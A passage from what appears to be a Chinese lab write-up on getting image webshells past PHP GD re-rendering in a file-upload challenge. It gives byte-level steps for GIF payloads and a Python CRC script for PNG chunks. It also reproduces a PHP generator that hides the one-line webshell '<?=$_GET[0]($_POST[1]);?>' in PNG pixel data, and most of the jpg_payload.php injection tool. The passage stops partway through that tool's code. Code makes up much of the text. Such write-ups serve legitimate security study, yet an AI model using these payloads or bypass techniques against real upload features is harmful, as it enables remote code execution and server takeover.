id=\"第一种方法\"><a href=\"#第一种方法\" class=\"headerlink\" title=\"第一种方法\"></a>第一种方法</h2><p>​    （Linux环境、php版本7.2.21）</p>\n<p>​    因为二次渲染那部分<code>if、else</code>无论如何都会执行<code>unlink</code>函数删除你的文件，需要在执行<code>imagecreatefromjpeg</code>时报错才能访问到自己原来上传的文件。</p>\n<h3 id=\"jpg格式\"><a href=\"#jpg格式\" class=\"headerlink\" title=\"jpg格式\"></a>jpg格式</h3><h4 id=\"准备并上传\"><a href=\"#准备并上传\" class=\"headerlink\" title=\"准备并上传\"></a>准备并上传</h4><p>​    需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200050.png\"></p>\n<h4 id=\"文件包含验证\"><a href=\"#文件包含验证\" class=\"headerlink\" title=\"文件包含验证\"></a>文件包含验证</h4><p>​    上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用<code>inclue.php</code>文件包含访问刚刚上传的文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200401.png\">    </p>\n<h3 id=\"其他格式\"><a href=\"#其他格式\" class=\"headerlink\" title=\"其他格式\"></a>其他格式</h3><p>​    如图成功访问就是图片马上传成功了。但是这个方法我只有<code>jpg</code>格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>，这三个函数的原理，让其报错即可。</p>\n<h2 id=\"第二种方法\"><a href=\"#第二种方法\" class=\"headerlink\" title=\"第二种方法\"></a>第二种方法</h2><p>​    （windows环境，php版本5.2.17）</p>\n<p>​    这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。</p>\n<p>​    用到的工具是<strong>Beyond Compare 4</strong>，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。</p>\n<h3 id=\"GIF格式\"><a href=\"#GIF格式\" class=\"headerlink\" title=\"GIF格式\"></a>GIF格式</h3><h4 id=\"准备并上传-1\"><a href=\"#准备并上传-1\" class=\"headerlink\" title=\"准备并上传\"></a>准备并上传</h4><p>​    上传一个使用<code>copy /b</code>指令制作的图片马，之前文章第13题用过。假设上传的图片马为<strong>yoo.gif</strong>，上传成功以后再下载下载的文件名为<strong>2119840023.gif</strong>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116203245.png\"></p>\n<h4 id=\"文件比较\"><a href=\"#文件比较\" class=\"headerlink\" title=\"文件比较\"></a>文件比较</h4><p>​    使用前面说的<strong>Beyond Compare 4</strong>工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件<strong>相同</strong>的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。<code>&lt;?php phpinfo(); ?&gt;</code>的十六进制是<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E</code>直接粘贴插入，在右边框中右键保存文件再进行上传。</p>\n<h4 id=\"文件包含验证-1\"><a href=\"#文件包含验证-1\" class=\"headerlink\" title=\"文件包含验证\"></a>文件包含验证</h4><p>​    上传以后进行文件包含，代码执行成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204104.png\"></p>\n<p>​    为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。</p>\n<h3 id=\"png格式\"><a href=\"#png格式\" class=\"headerlink\" title=\"png格式\"></a>png格式</h3><p>​    这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204635.png\"></p>\n<p>​    这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的<strong>头标识</strong>部分，修改的话就不是png格式图片，更过不了。</p>\n<p>​    所以我直接看答案了，还是前言里的<a href=\"https://xz.aliyun.com/t/2657#toc-3\">博客</a>。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。</p>\n<p>​    所以又出来了两种方法：</p>\n<ol>\n<li>修改CRC码</li>\n<li>直接生成图片</li>\n</ol>\n<h4 id=\"计算CRC码\"><a href=\"#计算CRC码\" class=\"headerlink\" title=\"计算CRC码\"></a>计算CRC码</h4><p>​    计算CRC码的<code>python</code>脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import binascii</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">png = open(r&#x27;1.png&#x27;,&#x27;rb&#x27;)</span><br><span class=\"line\">a = png.read()</span><br><span class=\"line\">png.close()</span><br><span class=\"line\">hexstr = binascii.b2a_hex(a)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span><br><span class=\"line\">data =  &#x27;504c5445&#x27;+ re.findall(&#x27;504c5445(.*?)49444154&#x27;,hexstr)[0]</span><br><span class=\"line\">crc = binascii.crc32(data[:-16].decode(&#x27;hex&#x27;)) &amp; 0xffffffff</span><br><span class=\"line\">print hex(crc)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h5><p>​    php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分<strong>写入代码</strong>，再重新计算CRC码，再修改原来的CRC码即可。</p>\n<h5 id=\"计算CRC码-1\"><a href=\"#计算CRC码-1\" class=\"headerlink\" title=\"计算CRC码\"></a>计算CRC码</h5><p>​    脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。</p>\n<p>这个方法我没有尝试，因为我不会python。<del>都2020年了还有人不会python，不会吧不会吧</del>。😒</p>\n<p>等我学会在回来改这一篇吧。</p>\n<h4 id=\"直接生成图片（写入实际数据模块）\"><a href=\"#直接生成图片（写入实际数据模块）\" class=\"headerlink\" title=\"直接生成图片（写入实际数据模块）\"></a>直接生成图片（写入实际数据模块）</h4><p>​    国外大牛的脚本，直接运行就会生成一个图片</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class=\"line\">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class=\"line\">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class=\"line\">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class=\"line\">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class=\"line\">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class=\"line\">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class=\"line\">           0x66, 0x44, 0x50, 0x33);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$img = imagecreatetruecolor(32, 32);</span><br><span class=\"line\"></span><br><span class=\"line\">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class=\"line\">   $r = $p[$y];</span><br><span class=\"line\">   $g = $p[$y+1];</span><br><span class=\"line\">   $b = $p[$y+2];</span><br><span class=\"line\">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class=\"line\">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>​    php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为<code>php.exe</code>的可执行文件，它是php提供的一种<strong>CLI</strong>模式，也就是<strong>命令行模式</strong>。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。</p>\n<p>​    还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。</p>\n<p>​    运行成功以后会找到一个名为<strong>1.png</strong>的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。</p>\n<p>​    但是这个生成的图片php代码是<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，<del>应该算吧</del></p>\n<h3 id=\"jpg格式-1\"><a href=\"#jpg格式-1\" class=\"headerlink\" title=\"jpg格式\"></a>jpg格式</h3><p>​    同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?php</span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class=\"line\"><span class=\"comment\">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class=\"line\"><span class=\"comment\">    2) Save the processed image and launch:</span></span><br><span class=\"line\"><span class=\"comment\">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class=\"line\"><span class=\"comment\">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class=\"line\"><span class=\"comment\">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class=\"line\"><span class=\"comment\">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    Sergey Bobrov <span class=\"doctag\">@Black</span>2Fan.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    See also:</span></span><br><span class=\"line\"><span class=\"comment\">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$miniPayload</span> = <span class=\"string\">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!extension_loaded(<span class=\"string\">&#x27;gd&#x27;</span>) || !function_exists(<span class=\"string\">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    set_error_handler(<span class=\"string\">&quot;custom_error_handler&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$pad</span> = <span class=\"number\">0</span>; <span class=\"variable\">$pad</span> &lt; <span class=\"number\">1024</span>; <span class=\"variable\">$pad</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$nullbytePayloadSize</span> = <span class=\"variable\">$pad</span>;</span><br><span class=\"line\">        <span class=\"variable\">$dis</span> = <span class=\"keyword\">new</span> DataInputStream(<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$outStream</span> = file_get_contents(<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$extraBytes</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"variable\">$correctImage</span> = <span class=\"literal\">TRUE</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$dis</span>-&gt;readShort() != <span class=\"number\">0xFFD8</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>((!<span class=\"variable\">$dis</span>-&gt;eof()) &amp;&amp; (<span class=\"variable\">$dis</span>-&gt;readByte() == <span class=\"number\">0xFF</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$marker</span> = <span class=\"variable\">$dis</span>-&gt;readByte();</span><br><span class=\"line\">            <span class=\"variable\">$size</span> = <span class=\"variable\">$dis</span>-&gt;readShort() - <span class=\"number\">2</span>;</span><br><span class=\"line\">            <span class=\"variable\">$dis</span>-&gt;skip(<span class=\"variable\">$size</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$marker</span> === <span class=\"number\">0xDA</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$startPos</span> = <span class=\"variable\">$dis</span>-&gt;seek();</span><br><span class=\"line\">                <span class=\"variable\">$outStreamTmp</span> = </span><br><span class=\"line\">                    substr(<span class=\"variable\">$outStream</span>, <span class=\"number\">0</span>, <span class=\"variable\">$startPos</span>) . </span><br><span class=\"line\">                    <span class=\"variable\">$miniPayload</span> . </span><br><span class=\"line\">                    str_repeat(<span class=\"string\">&quot;\\0&quot;</span>,<span class=\"variable\">$nullbytePayloadSize</span>) . </span><br><span class=\"line\">                    substr(<span class=\"variable\">$outStream</span>, <span class=\"variable\">$startPos</span>);</span><br><span class=\"line\">                checkImage(<span class=\"string\">&#x27;_&#x27;</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>], <span class=\"variable\">$outStreamTmp</span>, <span class=\"literal\">TRUE</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"variable\">$extraBytes</span> !== <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span>((!<span class=\"variable\">$dis</span>-&gt;eof())) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span>(<span class=\"variable\">$dis</span>-&gt;readByte() === <span class=\"number\">0xFF</span>) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span>(<span class=\"variable\">$dis</span>-&gt;readByte !== <span class=\"number\">0x00</span>) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"variable\">$stopPos</span> = <span class=\"variable\">$dis</span>-&gt;seek() - <span class=\"number\">2</span>;</span><br><span class=\"line\">                    <span class=\"variable\">$imageStreamSize</span> = <span class=\"variable\">$stopPos</span> - <span class=\"variable\">$startPos</span>;</span><br><span class=\"line\">                    <span class=\"variable\">$outStream</span> = </span><br><span class=\"line\">                        substr(<span class=\"variable\">$outStream</span>, <span class=\"number\">0</span>, <span class=\"variable\">$startPos</span>) . </span><br><span class=\"line\">                        <span class=\"variable\">$miniPayload</span> . </span><br><span class=\"line\">                        substr(</span><br><span class=\"line\">                            str_repeat(<span class=\"string\">&quot;\\0&quot;</span>,<span class=\"variable\">$nullbytePayloadSize</span>).</span><br><span class=\"line\">                                substr(<span class=\"variable\">$outStream</span>, <span class=\"variable\">$startPos</span>, <span class=\"variable\">$imageStreamSize</span>),</span><br><span class=\"line\">                            <span class=\"number\">0</span>,</span><br><span class=\"line\">                            <span class=\"variable\">$nullbytePayloadSize</span>+<span class=\"variable\">$imageStreamSize</span>-<span class=\"variable\">$extraBytes</span>) . </span><br><span class=\"line\">                                substr(<span class=\"variable\">$outStream</span>, <span class=\"variable\">$stopPos</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">elseif</span>(<span class=\"variable\">$correctImage</span>) &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$outStream</span> = <span class=\"variable\">$outStreamTmp</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(checkImage(<span class=\"string\">&#x27;payload_&#x27;</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>], <span class=\"variable\">$outStream</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Success!&#x27;</span>);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unlink(<span class=\"string\">&#x27;payload_&#x27;</span>.<span class=\"variable\">$argv</span>[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Something\\&#x27;s wrong&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>, <span class=\"variable\">$unlink</span> = <span class=\"literal\">FALSE</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$correctImage</span>;</span><br><span class=\"line\">        file_put_contents(<span class=\"variable\">$filename</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">        <span class=\"variable\">$correctImage</span> = <span class=\"literal\">TRUE</span>;</span><br><span class=\"line\">        imagecreatefromjpeg(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$unlink</span>)</span><br><span class=\"line\">            unlink(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$correctImage</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">custom_error_handler</span>(<span class=\"params\"><span class=\"variable\">$errno</span>, <span class=\"variable\">$errstr</span>, <span class=\"variable\">$errfile</span>, <span class=\"variable\">$errline</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$extraBytes</span>, <span class=\"variable\">$correctImage</span>;</span><br><span class=\"line\">        <span class=\"variable\">$correctImage</span> = <span class=\"literal\">FALSE</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/(\\d+) extraneous bytes before marker/&#x27;</span>, <span class=\"variable\">$errstr</span>, <span class=\"variable\">$m</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$m</span>[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$extraBytes</span> = (<span class=\"keyword\">int</span>)<span class=\"variable\">$m</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DataInputStream</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$binData</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$order</span>;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"variable\">$size</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$filename</span>, <span class=\"variable\">$order</span> = <span class=\"literal\">false</span>, <span class=\"variable\">$fromString</span> = <span class=\"literal\">false</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;order = <span class=\"variable\">$order</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!<span class=\"variable\">$fromString</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!file_exists(<span class=\"variable\">$filename</span>) || !is_file(<span class=\"variable\">$filename</span>))</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;File not exists [&#x27;</span>.<span class=\"variable\">$filename</span>.<span class=\"string\">&#x27;]&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;binData = file_get_contents(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;binData = <span class=\"variable\">$filename</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;size = strlen(<span class=\"keyword\">$this</span>-&gt;binData);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">seek</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"keyword\">$this</span>-&gt;size - strlen(<span class=\"keyword\">$this</span>-&gt;binData));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">skip</span>(<span class=\"params\"><span class=\"variable\">$skip</span></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"variable\">$skip</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readByte</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;eof()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;End Of File&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span 